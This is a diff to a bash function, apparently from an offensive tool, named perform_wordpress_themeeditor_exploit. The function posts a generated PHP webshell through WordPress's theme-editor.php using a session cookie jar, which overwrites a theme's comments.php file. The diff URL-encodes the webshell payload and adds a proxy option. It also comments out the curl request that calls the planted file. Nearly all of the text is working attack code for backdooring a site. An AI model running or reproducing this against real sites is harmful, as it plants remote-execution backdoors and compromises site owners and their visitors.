@@ -402,16 +402,17 @@ perform_wordpress_themeeditor_exploit() {
         echo "Failed to extract hidden inputs."
         return 1
     fi
-    echo "$response" | awk '/<textarea\>/ {flag=1; next} (flag) {print} /<\/textarea>/ {flag=0}' 
+    #echo "$response" | awk '/<textarea\>/ {flag=1; next} (flag) {print} /<\/textarea>/ {flag=0}' 
     minimize_webshell=true
     create_php_webshell
     webshell=$(cat webshell.php)
+    newcontent=$(urlencode "$webshell")
+    echo "Webshell content: $newcontent"
     response=$(curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-admin/theme-editor.php" \
-        -d "newcontent=$webshell" \
         -d "$hidden_inputs" \
-        -d "newcontent=$(urlencode "$webshell")" \
-        -d "Submit=Update+File" )
-    curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/themes/$theme_name/comments.php" --proxy localhost:8080
+        -d "newcontent=$newcontent" \
+        -d "Submit=Update+File" $proxy_option)
+    #curl -s -b "$cookie_jar" -c "$cookie_jar" "$target_url/wp-content/themes/$theme_name/comments.php" $proxy_option
     popd || return 1
 
 }
